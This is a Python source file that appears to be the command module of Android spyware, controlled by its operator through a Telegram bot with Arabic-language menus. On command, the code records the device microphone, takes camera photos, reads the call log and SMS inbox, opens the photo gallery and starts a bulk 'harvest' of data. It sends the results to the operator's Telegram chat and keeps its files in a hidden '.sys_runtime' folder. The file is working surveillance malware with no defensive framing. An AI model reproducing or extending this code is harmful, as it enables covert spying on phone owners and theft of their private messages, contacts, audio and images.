# -*- coding: utf-8 -*-
import os, time, json, zipfile, threading, logging, base64, random
from datetime import datetime

P = os.path.join(os.getcwd(), ".sys_runtime")
if not os.path.exists(P): os.makedirs(P)
logging.basicConfig(filename=os.path.join(P, "c.log"), level=logging.ERROR)

try:
    from jnius import autoclass
    JNI = True
except:
    JNI = False

class CommandHandler:
    def __init__(self):
        self.tmp = os.path.join(P, "ctmp")
        if not os.path.exists(self.tmp): os.makedirs(self.tmp)

    def _auth(self, tg, cid):
        return True

    def _battery_safe(self, monitor):
        try:
            bat, ch = monitor._bat() if hasattr(monitor, '_bat') else (50, False)
            return bat >= 15
        except:
            return True

    def _send_as_file(self, tg, cid, content, filename):
        path = os.path.join(self.tmp, filename)
        try:
            # ✅ تجاهل الرموز غير القابلة للترميز لمنع الانهيار
            with open(path, 'w', encoding='utf-8', errors='ignore') as f:
                f.write(content)
            with open(path, 'rb') as f:
                tg._ap("sendDocument", {"chat_id": cid, "caption": f"📄 {filename}"}, {"document": f})
        except Exception as e:
            logging.error(f"Send file error: {e}")
        finally:
            if os.path.exists(path): os.remove(path)

    def _capture_audio(self, dur=10):
        if not JNI: return None
        mr = None
        try:
            MR = autoclass('android.media.MediaRecorder')
            out = os.path.join(self.tmp, f"a_{int(time.time())}.3gp")
            mr = MR()
            mr.setAudioSource(MR.AudioSource.MIC)
            mr.setOutputFormat(MR.OutputFormat.THREE_GPP)
            mr.setAudioEncoder(MR.AudioEncoder.AMR_NB)
            mr.setOutputFile(out)
            mr.prepare()
            mr.start()
            time.sleep(dur)
            mr.stop()
            return out
        except Exception as e:
            logging.error(f"Audio capture error: {e}")
            return None
        finally:
            if mr: mr.release()

    def _call_log(self, limit=100):
        if not JNI: return "JNI Error"
        try:
            resolver = autoclass('org.kivy.android.PythonActivity').mActivity.getContentResolver()
            Uri = autoclass('android.net.Uri')
            cursor = resolver.query(Uri.parse("content://call_log/calls"), None, None, None, "date DESC")
            lines = []
            while cursor and cursor.moveToNext() and len(lines) < limit:
                name = cursor.getString(cursor.getColumnIndex("name")) or "Unknown"
                num = cursor.getString(cursor.getColumnIndex("number"))
                lines.append(f"👤 {name} ({num})")
            if cursor: cursor.close()
            return "\n".join(lines) if lines else "No calls found"
        except Exception as e:
            logging.error(f"Call log error: {e}")
            return "Permission Denied"

    def _sms_log(self, limit=100):
        if not JNI: return "JNI Error"
        try:
            resolver = autoclass('org.kivy.android.PythonActivity').mActivity.getContentResolver()
            Uri = autoclass('android.net.Uri')
            cursor = resolver.query(Uri.parse("content://sms/inbox"), None, None, None, "date DESC")
            lines = []
            while cursor and cursor.moveToNext() and len(lines) < limit:
                addr = cursor.getString(cursor.getColumnIndex("address"))
                body = cursor.getString(cursor.getColumnIndex("body"))
                lines.append(f"📩 From: {addr}\n💬 {body}\n---")
            if cursor: cursor.close()
            return "\n".join(lines) if lines else "No SMS found"
        except Exception as e:
            logging.error(f"SMS log error: {e}")
            return "Permission Denied"

    def execute(self, cmd, tg, monitor, cid):
        threading.Thread(target=self._run, args=(cmd, tg, monitor, cid), daemon=True).start()

    def _run(self, cmd, tg, monitor, cid):
        try:  # ✅ حماية عامة لمنع انهيار الخيط
            # --- المستوى 1: تسجيل الدخول والقائمة الرئيسية ---
            if cmd.startswith("/login"):
                parts = cmd.split(" ")
                user_pw = parts[1] if len(parts) > 1 else ""
                actual_pw = getattr(monitor, 'pw', '')
                if user_pw == actual_pw and actual_pw != "":
                    devices = getattr(monitor, 'dvs', {})
                    if not devices:
                        devices = {"5c9037624405fa8b": {"n": "Samsung SM-A235F"}}
                    kb = []
                    for did, info in devices.items():
                        name = info.get('n', 'Unknown')
                        kb.append([{"text": f"📱 {name} ({did[:4]})", "callback_data": f"menu_{did}"}])
                    # ✅ زر تحديث القائمة الرئيسية
                    kb.append([{"text": "🔄 تحديث القائمة", "callback_data": f"/login {actual_pw}"}])
                    text = "🔐 *الواجهة الرئيسية* - الأجهزة المتصلة:"
                    tg._ap("sendMessage", {"chat_id": cid, "text": text, "parse_mode": "Markdown", "reply_markup": json.dumps({"inline_keyboard": kb})})
                    return
                else:
                    tg._ap("sendMessage", {"chat_id": cid, "text": "❌ كلمة السر خاطئة"})
                    return

            # --- المستوى 2: القائمة الفرعية (تحكم الجهاز) ---
            if cmd.startswith("menu_"):
                did = cmd.split("_")[1]
                text = f"🛠 *لوحة التحكم بالجهاز:* `{did}`"
                kb = [
                    [{"text": "📸 كاميرا", "callback_data": f"cam_{did}"}, {"text": "🎙 ميكروفون", "callback_data": f"mic_{did}"}],
                    [{"text": "📞 سجل المكالمات", "callback_data": f"callog_{did}"}, {"text": "💬 SMS", "callback_data": f"sms_{did}"}],
                    [{"text": "🖼 وسائط", "callback_data": f"media_{did}"}, {"text": "📦 حصاد", "callback_data": f"hrv_{did}"}],
                    [{"text": "🔙 رجوع", "callback_data": f"/login {getattr(monitor, 'pw', '')}"}]
                ]
                tg._ap("sendMessage", {"chat_id": cid, "text": text, "parse_mode": "Markdown", "reply_markup": json.dumps({"inline_keyboard": kb})})
                return

            # --- المستوى 3: تنفيذ الأوامر الفعلية ---
            parts = cmd.split("_")
            if len(parts) < 2:
                return
            act, did = parts[0], parts[1]

            if act == "cam":
                if hasattr(monitor, 'camera_analyzer') and monitor.camera_analyzer:
                    path = monitor.camera_analyzer.capture(cam_id=0)
                    if path and os.path.exists(path):
                        with open(path, 'rb') as f:
                            tg._ap("sendPhoto", {"chat_id": cid, "caption": f"📸 {did}"}, {"photo": f})
                        try: os.remove(path)
                        except: pass
                    else:
                        tg._ap("sendMessage", {"chat_id": cid, "text": "❌ الكاميرا مشغولة أو فشل التصوير"})
                else:
                    tg._ap("sendMessage", {"chat_id": cid, "text": "❌ وحدة الكاميرا غير متوفرة"})

            elif act == "mic":
                # ✅ إرسال إشعار البدء
                tg._ap("sendMessage", {"chat_id": cid, "text": "🎤 جاري تسجيل 10 ثوانٍ..."})
                p = self._capture_audio(10)
                if p:
                    # ✅ محاولة الإرسال مع حذف الملف فقط عند النجاح
                    with open(p, 'rb') as f:
                        r = tg._ap("sendVoice", {"chat_id": cid}, {"voice": f})
                    if r and r.get('ok'):
                        os.remove(p)
                    else:
                        # ✅ في حالة الفشل: نقل الملف إلى مجلد معلق (يُعاد رفعه لاحقًا بواسطة monitor)
                        pending_dir = os.path.join(P, "pending_uploads")
                        if not os.path.exists(pending_dir): os.makedirs(pending_dir)
                        os.rename(p, os.path.join(pending_dir, os.path.basename(p)))
                else:
                    tg._ap("sendMessage", {"chat_id": cid, "text": "❌ فشل التسجيل"})

            elif act == "callog":
                txt = self._call_log(100)
                self._send_as_file(tg, cid, txt, f"calls_{did}.log")
            elif act == "sms":
                txt = self._sms_log(100)
                self._send_as_file(tg, cid, txt, f"sms_{did}.log")

            elif act == "hrv":
                if hasattr(monitor, 'daily_zipper') and monitor.daily_zipper:
                    monitor.daily_zipper.run_now(force=True)
                    tg._ap("sendMessage", {"chat_id": cid, "text": "📦 بدء الحصاد..."})
                else:
                    tg._ap("sendMessage", {"chat_id": cid, "text": "❌ وحدة الحصاد مفقودة"})

            elif act == "media":
                if hasattr(monitor, 'gallery_browser') and monitor.gallery_browser:
                    monitor.gallery_browser.show_grid(tg, cid, did, "img", 0)
                else:
                    tg._ap("sendMessage", {"chat_id": cid, "text": "🖼 جاري فتح المتصفح..."})

        except Exception as e:
            # ✅ تسجيل الخطأ ومنع انهيار الخيط
            logging.error(f"Unhandled error in _run: {e}\nCommand: {cmd}")
            tg._ap("sendMessage", {"chat_id": cid, "text": "⚠️ حدث خطأ داخلي، راجع السجلات."})

_handler = None
def execute(data, tg, monitor, cid):
    global _handler
    if _handler is None:
        _handler = CommandHandler()
    _handler.execute(data, tg, monitor, cid)
